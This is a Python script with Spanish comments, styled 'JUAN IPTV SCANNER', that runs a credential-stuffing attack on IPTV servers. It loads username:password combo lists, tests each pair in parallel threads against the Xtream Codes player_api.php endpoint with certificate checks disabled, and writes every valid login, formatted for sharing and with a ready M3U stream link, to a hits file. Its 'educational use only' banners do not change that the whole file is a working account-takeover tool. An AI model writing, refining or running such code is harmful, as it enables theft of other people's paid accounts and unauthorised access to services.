#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Escáner de IPTV para Termux - Estilo Juan
Uso educativo únicamente en redes propias o con autorización.
"""

import requests
import json
import time
import threading
import queue
import os
import sys
from datetime import datetime

# Deshabilitar advertencias de SSL (para evitar ruido)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Banner con nombre "Juan"
BANNER = """
╔══════════════════════════════════════════╗
║      🐉  JUAN IPTV SCANNER  🐉          ║
║        Solo para fines educativos         ║
╚══════════════════════════════════════════╝
"""

def limpiar_pantalla():
    """Limpia la pantalla según el sistema operativo."""
    os.system('clear' if os.name == 'posix' else 'cls')

def mostrar_banner():
    """Muestra el banner principal."""
    print(BANNER)
    print("  [!] Uso responsable. No atacar servidores ajenos.\n")

def cargar_combos(ruta_archivo):
    """Carga combos desde archivo ignorando comentarios y líneas de formato de otros checkers."""
    combos = []
    try:
        with open(ruta_archivo, 'r', encoding='utf-8', errors='ignore') as f:
            for linea in f:
                linea = linea.strip()
                # Ignorar comentarios, líneas vacías o encabezados de formato obsoletos
                if not linea or linea.startswith('#') or linea.lower().startswith('format'):
                    continue
                
                if ':' in linea:
                    user, pwd = linea.split(':', 1)
                    combos.append((user, pwd))
    except FileNotFoundError:
        print(f" [!] Error: No se encuentra el archivo '{ruta_archivo}'")
        sys.exit(1)
    return combos

def probar_combo(server, user, pwd, timeout=10):
    """
    Prueba un combo contra el servidor Xtream Codes.
    Retorna (bool, dict_info) donde bool indica si es hit.
    """
    url = f"{server}/player_api.php?username={user}&password={pwd}"
    try:
        resp = requests.get(url, timeout=timeout, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            # Si es un diccionario con user_info, es válido
            if isinstance(data, dict) and data.get('user_info'):
                return True, data
    except:
        pass
    return False, None

def guardar_hit(server, user, pwd, info, archivo_salida):
    """Guarda un hit encontrado en el archivo con formato premium estilo Telegram."""
    user_info = info.get('user_info', {})
    
    # Manejo del estado de la cuenta
    is_active = user_info.get('status', 'Active')
    status_emoji = "🟢 ACTIVA" if is_active.lower() == 'active' else "🔴 INACTIVA"
    
    # Formatear fecha de expiración
    exp_date = user_info.get('exp_date', 'N/A')
    if exp_date and exp_date != 'N/A':
        try:
            exp_date = datetime.fromtimestamp(int(exp_date)).strftime('%d/%m/%Y')
        except:
            pass
            
    # Conexiones
    active_cons = user_info.get('active_cons', '0')
    max_cons = user_info.get('max_connections', '0')
    
    # Intenta parsear listas de contenido si el json base las trae indexadas
    categories = info.get('categories', {})
    canales = len(categories.get('live', [])) if 'live' in categories else "Verificando..."
    peliculas = len(categories.get('movie', [])) if 'movie' in categories else "Verificando..."
    series = len(categories.get('series', [])) if 'series' in categories else "Verificando..."

    # Construir la estructura visual solicitada
    plantilla = (
        f"⛩️ RESULTADO DEL ESCANEO ⛩️\n"
        f"───────────────────────\n"
        f" 『 🐉 JUAN IPTV SCANNER 🐉 』\n\n"
        f" ﹝ 👤 CUENTA ﹞\n"
        f" ◊ User: {user}\n"
        f" ◊ Pass: {pwd}\n"
        f" ◊ Status: {status_emoji}\n"
        f" ◊ Expiry: {exp_date}\n"
        f" ◊ Conns: {active_cons}/{max_cons}\n\n"
        f" ﹝ 📊 CONTENIDO ﹞\n"
        f" 📺 Canales: {canales}\n"
        f" 🎬 Películas: {peliculas}\n"
        f" 🎥 Series: {series}\n\n"
        f" ﹝ 🌐 SERVIDOR ﹞\n"
        f" 🔗 Host: {server}\n"
        f" 📍 IP: Oculta\n"
        f" ───────────────────────\n"
        f" 📥 LINK M3U:\n"
        f" {server}/get.php?username={user}&password={pwd}&type=m3u_plus\n"
        f" ───────────────────────\n"
        f" ⏰ {datetime.now().strftime('%H:%M')} | SCAN COMPLETE\n"
        f"{'='*40}\n\n"
    )
    
    with open(archivo_salida, 'a', encoding='utf-8') as f:
        f.write(plantilla)
        
    return plantilla

def trabajador(server, combo_queue, resultados, hits, lock, archivo_salida, estado):
    """
    Función ejecutada por cada hilo.
    Toma combos de la cola y los prueba.
    """
    while True:
        try:
            idx, user, pwd = combo_queue.get(timeout=1)
        except queue.Empty:
            break
        
        # Actualizar estado del combo actual
        with lock:
            estado['actual'] = f"{user}:{pwd}"
        
        # Probar
        es_hit, info = probar_combo(server, user, pwd)
        
        if es_hit:
            with lock:
                hits[0] += 1
                resultados.append((user, pwd, info))
                # Guardamos y capturamos la plantilla premium texturizada
                texto_pantalla = guardar_hit(server, user, pwd, info, archivo_salida)
                
                # Limpiar la barra dinámica para que el diseño no se rompa en Termux
                sys.stdout.write("\r" + " " * 85 + "\r")
                sys.stdout.flush()
                
                # Desplegar hit estructurado en consola
                print(f"\n[+] ¡HIT ENCONTRADO #{hits[0]}!")
                print(texto_pantalla)
        
        combo_queue.task_done()
        
        # Pequeña pausa para no saturar
        time.sleep(0.05)

def mostrar_estado(estado, hits, total, iniciado):
    """Muestra la línea de estado actual (se actualiza dinámicamente)."""
    procesados = estado['procesados']
    porcentaje = (procesados / total) * 100 if total > 0 else 0
    tiempo_trans = time.time() - iniciado
    cps = procesados / tiempo_trans if tiempo_trans > 0 else 0
    linea = (f"\r[*] Progreso: {procesados}/{total} ({porcentaje:.1f}%) | "
             f"Hits: {hits[0]} | Actual: {estado['actual']:<24} | "
             f"{cps:.1f} c/s   ")
    sys.stdout.write(linea)
    sys.stdout.flush()

def escanear(server, combos, num_hilos=10):
    """
    Función principal de escaneo.
    """
    total = len(combos)
    combo_queue = queue.Queue()
    for i, (user, pwd) in enumerate(combos):
        combo_queue.put((i+1, user, pwd))
    
    resultados = []
    hits = [0]
    lock = threading.Lock()
    estado = {'actual': 'Iniciando...', 'procesados': 0}
    archivo_salida = f"hits_{server.replace('http://','').replace('https://','').replace(':','_')}.txt"
    
    # Hilos
    hilos = []
    for _ in range(num_hilos):
        t = threading.Thread(target=trabajador, args=(server, combo_queue, resultados, hits, lock, archivo_salida, estado))
        t.daemon = True
        t.start()
        hilos.append(t)
    
    # Monitor de progreso
    inicio = time.time()
    while any(t.is_alive() for t in hilos):
        with lock:
            procesados = total - combo_queue.qsize()
            estado['procesados'] = procesados
        mostrar_estado(estado, hits, total, inicio)
        time.sleep(0.5)
    
    # Mostrar final
    mostrar_estado(estado, hits, total, inicio)
    print("\n\n" + "="*60)
    print(f" ✓ Escaneo completado. Hits encontrados: {hits[0]}")
    if hits[0] > 0:
        print(f" ✓ Resultados guardados en: {archivo_salida}")
    print("="*60)

def main():
    limpiar_pantalla()
    mostrar_banner()
    
    # Entrada de datos
    servidor = input(" 🌐 Ingresa la URL del servidor IPTV (ej: http://ejemplo.com:8080): ").strip()
    if not servidor.startswith("http"):
        servidor = "http://" + servidor
    # Eliminar barra final si existe
    servidor = servidor.rstrip('/')
    
    ruta_combo = input(" 📂 Ruta del archivo de combos (ej: /sdcard/combo/mis_combos.txt): ").strip()
    if not os.path.exists(ruta_combo):
        print(f" [!] El archivo '{ruta_combo}' no existe. Saliendo.")
        sys.exit(1)
    
    try:
        num_hilos = int(input(" ⚙️  Número de hilos (recomendado 10-20): ") or "10")
    except:
        num_hilos = 10
    
    print("\n[*] Cargando combos...")
    combos = cargar_combos(ruta_combo)
    if not combos:
        print(" [!] No se encontraron combos válidos en el archivo.")
        sys.exit(1)
    
    print(f"[*] Total de combos a probar: {len(combos)}")
    print(f"[*] Usando {num_hilos} hilos. Presiona Ctrl+C para detener.\n")
    time.sleep(2)
    
    try:
        escanear(servidor, combos, num_hilos)
    except KeyboardInterrupt:
        print("\n\n [!] Escaneo interrumpido por el usuario.")
        sys.exit(0)

if __name__ == "__main__":
    main()
